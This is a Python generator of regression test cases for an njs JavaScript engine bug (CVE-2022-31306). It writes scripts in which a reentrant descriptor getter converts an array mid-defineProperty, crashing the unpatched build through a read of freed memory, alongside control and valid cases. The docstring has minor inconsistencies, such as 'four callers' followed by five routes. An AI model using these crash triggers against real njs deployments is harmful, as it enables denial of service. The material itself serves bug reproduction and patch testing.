"""Write the JavaScript case files for njs.cve-2022-31306 (a reentrant
property descriptor that converts a fast array during Object.defineProperty).

Usage: python3 recurdesc_cases.py OUTDIR

Writes OUTDIR/<case>.js and OUTDIR/cases.tsv with the columns case, family,
field, conv, idx, faulty, absent. Each script defines the printer below,
performs one Object.defineProperty call and prints one line describing the
resulting array (its length and, per index, whether the own property is a
value, an accessor or a hole), so that njs and the reference engine print
the same text for the same final state. The expected output is the
reference engine's output on the same file (scripts/njs_cases.py --oracle).

Mechanism under test (src/njs_object_prop.c at the base commit f65981b0):
njs_object_prop_define() queries the property of the target once
(njs_property_query), then reads the supplied descriptor object with
njs_descriptor_prop(), which fetches the descriptor fields get, set, value,
writable, enumerable and configurable with ordinary property gets. If a
field is an accessor whose getter runs code that converts the target fast
array to a slow array (njs_array_convert_to_slow_array frees array->start
and clears object.fast_array), the cached query result, of kind
NJS_PROPERTY_REF for an existing fast-array element, is stale. After the
descriptor is read, the NJS_PROPERTY_REF arm calls
njs_array_convert_to_slow_array() a second time; the base build then reads
array->start[i] over the freed storage (a read of a released pointer; the
report in the dataset is a SEGV at the zero page). The developer patch adds
an early return to njs_array_convert_to_slow_array() when the array is not a
fast array, so the second call is a no-op. The state of the note is the
second conversion of an array whose start was already released.

The four callers of njs_array_convert_to_slow_array() are the conversion
routes a getter can take to release array->start:
  defp   Object.defineProperty(a, 1, {get: fn})   src/njs_object_prop.c
  freeze Object.freeze(a)                          src/njs_object.c
  seal   Object.seal(a)                            src/njs_object.c
  idxbig a[70000] = 1  (index >= NJS_ARRAY_LARGE_OBJECT_LENGTH) src/njs_value.c
  lenset a.length = 70000                          src/njs_array.c

Families (family column; case name prefix):
  rc  rc_<field>_<conv>   outer Object.defineProperty(a, 1, d) on the fast
                      array [11, 22]; d.<field> is an accessor whose getter
                      converts a by <conv>; field in get, set (an accessor
                      descriptor for the outer define); conv as above. These
                      reach the reported faulty state: the cached
                      NJS_PROPERTY_REF of index 1 drives a second call of
                      njs_array_convert_to_slow_array() after the getter has
                      released array->start; the base build reads the
                      released start (NULL) in the second call.
  rc  rc_idx0_<conv>      the outer define targets index 0 (field get).
  rc  rc_newidx_<conv>    the outer define targets a new index (5, field
                      get); it reaches the same faulty state.
  rc  rc_depth2           the getter's conversion is itself a reentrant
                      define, so the array is converted at two nested levels.
  reent rc_<field>_<conv> field in value, writable, enumerable,
                      configurable (a data or generic descriptor for the
                      outer define). These do not reach the convert arm; the
                      outer write takes the direct NJS_PROPERTY_REF write
                      path, which does not call the conversion a second time,
                      so the base build does not crash. njs resolves the
                      reentrant define to a different final array state than
                      the reference on several of them (a reentrancy-ordering
                      difference, the same before and after the patch, a
                      residual unrelated to the reported crash).
  ctl_*               controls that do not reach the faulty state: a plain
                      (non-reentrant) accessor or data descriptor, a getter
                      that does not convert the array, a reentrant getter on
                      a non-array object and on an array-like object, and a
                      define on an array that is already slow.
  valid_*             ordinary defineProperty results compared with the
                      reference to form the output digest.

The expected output of each case is the reference engine's output on the
same file; a case that reaches the faulty state crashes the base build and
is classified ASAN there, OK after the patch when its printed final state
equals the reference. Syntax is limited to what njs at the base commit
parses (no classes, no arrow bodies with blocks beyond one statement is
avoided; plain function expressions are used).
"""
import sys
from pathlib import Path

PRELUDE = r"""
function vstr(v) {
    // engine-independent rendering of a data value (Function.prototype.toString
    // and Object.prototype.toString differ between engines, so a function or an
    // object is rendered by its kind, not by String(v))
    var t = typeof v;
    if (t === 'function') return 'fn';
    if (v !== null && t === 'object') return Array.isArray(v) ? 'arr' : 'obj';
    return String(v);
}
function kind(a, i) {
    var d = Object.getOwnPropertyDescriptor(a, i);
    if (d === undefined) return 'hole';
    if ('value' in d) return 'v' + vstr(d.value);
    return (d.get ? 'G' : '') + (d.set ? 'S' : '') || 'A';
}
function show(a) {
    if (!(a instanceof Object)) return typeof a + ':' + String(a);
    var n = a.length, head = [], present = 0, cap = 6;
    var lim = n < cap ? n : cap;
    for (var j = 0; j < lim; j++) head.push(kind(a, j));
    for (var i = 0; i < n; i++) if (Object.prototype.hasOwnProperty.call(a, i)) present++;
    return 'len' + n + ' own' + present + ' head[' + head.join(',') + ']';
}
function out(f) { var r; try { r = show(f()); } catch (e) { r = 'E:' + e.name; } console.log(r); }
"""

# conv name -> JavaScript statement that converts the array `a` to a slow array
CONV = {
    "defp": "Object.defineProperty(a, 1, {get: function () {}});",
    "freeze": "Object.freeze(a);",
    "seal": "Object.seal(a);",
    "idxbig": "a[70000] = 1;",
    "lenset": "a.length = 70000;",
}
FIELDS = ["get", "set", "value", "writable", "enumerable", "configurable"]


def reentrant_define(idx, field, conv, target="a", arr="[11, 22]"):
    """Outer Object.defineProperty(target, idx, d) where d.<field> is an
    accessor whose getter converts `a` via conv and then returns a function."""
    return (
        f"var a = {arr};\n"
        f"function g() {{ {CONV[conv]} return function () {{}}; }}\n"
        "var d = {};\n"
        f"Object.defineProperty(d, '{field}', {{get: g, configurable: true}});\n"
        f"out(function () {{ Object.defineProperty({target}, {idx}, d); return a; }});\n"
    )


def rc_cases():
    for field in FIELDS:
        # an accessor-descriptor field (get, set) drives the outer define into
        # the convert arm and reaches the reported faulty state; a data or
        # generic field (value, writable, enumerable, configurable) takes the
        # direct write path and is recorded as the residual family reent
        fam, faulty = ("rc", 1) if field in ("get", "set") else ("reent", 0)
        for conv in CONV:
            yield (f"rc_{field}_{conv}", fam, field, conv, 1, faulty, reentrant_define(1, field, conv))
    for conv in CONV:
        yield (f"rc_newidx_{conv}", "rc", "get", conv, 5, 1, reentrant_define(5, "get", conv))
        yield (f"rc_idx0_{conv}", "rc", "get", conv, 0, 1, reentrant_define(0, "get", conv))
    # two nested reentrant conversions before the outer define completes
    yield ("rc_depth2", "rc", "get", "defp", 1, 1,
           "var a = [11, 22];\n"
           "function g2() { Object.defineProperty(a, 0, {get: function () {}}); return function () {}; }\n"
           "function g1() { var d2 = {}; Object.defineProperty(d2, 'get', {get: g2, configurable: true});\n"
           "               Object.defineProperty(a, 1, d2); return function () {}; }\n"
           "var d = {};\nObject.defineProperty(d, 'set', {get: g1, configurable: true});\n"
           "out(function () { Object.defineProperty(a, 1, d); return a; });\n")


def ctl_cases():
    # non-reentrant accessor descriptors
    yield ("ctl_plain_get", "ctl", "get", "none", 1, 0,
           "var a = [11, 22];\nout(function () { Object.defineProperty(a, 1, {get: function () { return 7; }}); return a; });\n")
    yield ("ctl_plain_set", "ctl", "set", "none", 1, 0,
           "var a = [11, 22];\nout(function () { Object.defineProperty(a, 1, {set: function (v) {}}); return a; });\n")
    yield ("ctl_plain_getset", "ctl", "get", "none", 1, 0,
           "var a = [11, 22];\nout(function () { Object.defineProperty(a, 1, {get: function () { return 7; }, set: function (v) {}}); return a; });\n")
    # data descriptors
    yield ("ctl_data", "ctl", "value", "none", 1, 0,
           "var a = [11, 22];\nout(function () { Object.defineProperty(a, 1, {value: 99}); return a; });\n")
    yield ("ctl_data_ro", "ctl", "value", "none", 1, 0,
           "var a = [11, 22];\nout(function () { Object.defineProperty(a, 1, {value: 99, writable: false, configurable: false}); return a; });\n")
    # a reentrant getter that does NOT convert the array (reads only)
    yield ("ctl_noconv", "ctl", "set", "none", 1, 0,
           "var a = [11, 22];\nfunction g() { var x = a[0]; return function () {}; }\n"
           "var d = {};\nObject.defineProperty(d, 'set', {get: g, configurable: true});\n"
           "out(function () { Object.defineProperty(a, 1, d); return a; });\n")
    # reentrant getter on a non-array object (no conversion path)
    yield ("ctl_nonarray", "ctl", "set", "none", 1, 0,
           "var a = {0: 11, 1: 22, length: 2};\nfunction g() { a.extra = 1; return function () {}; }\n"
           "var d = {};\nObject.defineProperty(d, 'set', {get: g, configurable: true});\n"
           "out(function () { Object.defineProperty(a, 1, d); return a; });\n")
    # reentrant getter whose conversion runs on a different array than the outer target
    yield ("ctl_otherarray", "ctl", "set", "none", 1, 0,
           "var a = [11, 22];\nvar b = [1, 2];\nfunction g() { Object.freeze(b); return function () {}; }\n"
           "var d = {};\nObject.defineProperty(d, 'set', {get: g, configurable: true});\n"
           "out(function () { Object.defineProperty(a, 1, d); return a; });\n")
    # outer target is already a slow array before the reentrant getter runs
    yield ("ctl_slow_first", "ctl", "set", "none", 1, 0,
           "var a = [11, 22];\nObject.defineProperty(a, 0, {get: function () { return 1; }});\n"
           "function g() { Object.defineProperty(a, 1, {get: function () {}}); return function () {}; }\n"
           "var d = {};\nObject.defineProperty(d, 'set', {get: g, configurable: true});\n"
           "out(function () { Object.defineProperty(a, 1, d); return a; });\n")


def valid_cases():
    rows = [
        ("valid_accessor", "var a = [1, 2, 3];\nout(function () { Object.defineProperty(a, 1, {get: function () { return 5; }}); return a; });\n"),
        ("valid_data", "var a = [1, 2, 3];\nout(function () { Object.defineProperty(a, 1, {value: 8, writable: true}); return a; });\n"),
        ("valid_newindex", "var a = [1, 2];\nout(function () { Object.defineProperty(a, 4, {value: 9}); return a; });\n"),
        ("valid_freeze", "var a = [1, 2, 3];\nObject.freeze(a);\nout(function () { return a; });\n"),
        ("valid_seal", "var a = [1, 2, 3];\nObject.seal(a);\nout(function () { return a; });\n"),
        ("valid_lenbig", "var a = [1, 2];\na.length = 70000;\nout(function () { return a; });\n"),
        ("valid_idxbig", "var a = [1, 2];\na[70000] = 9;\nout(function () { a.length = 3; return a; });\n"),
        ("valid_defprops", "var a = [1, 2];\nout(function () { Object.defineProperties(a, {0: {value: 7}, 1: {get: function () { return 8; }}}); return a; });\n"),
        ("valid_redefine_data_to_acc", "var a = [1, 2];\nObject.defineProperty(a, 0, {value: 3});\nout(function () { Object.defineProperty(a, 0, {get: function () { return 4; }}); return a; });\n"),
        ("valid_nonconf", "var a = [1, 2];\nObject.defineProperty(a, 0, {value: 1, configurable: false});\nout(function () { try { Object.defineProperty(a, 0, {value: 2}); } catch (e) { return [e.name]; } return a; });\n"),
    ]
    for name, body in rows:
        yield (name, "valid", "na", "na", 0, 0, body)


def main():
    outdir = Path(sys.argv[1])
    outdir.mkdir(parents=True, exist_ok=True)
    rows = ["case\tfamily\tfield\tconv\tidx\tfaulty\tabsent"]
    seen = set()
    for gen in (rc_cases, ctl_cases, valid_cases):
        for name, family, field, conv, idx, faulty, body in gen():
            assert name not in seen, name
            seen.add(name)
            (outdir / f"{name}.js").write_text(PRELUDE.lstrip("\n") + body)
            rows.append(f"{name}\t{family}\t{field}\t{conv}\t{idx}\t{faulty}\t{'ref' if faulty else 'none'}")
    (outdir / "cases.tsv").write_text("\n".join(rows) + "\n")
    print(f"{len(rows) - 1} cases written to {outdir}")


if __name__ == "__main__":
    main()
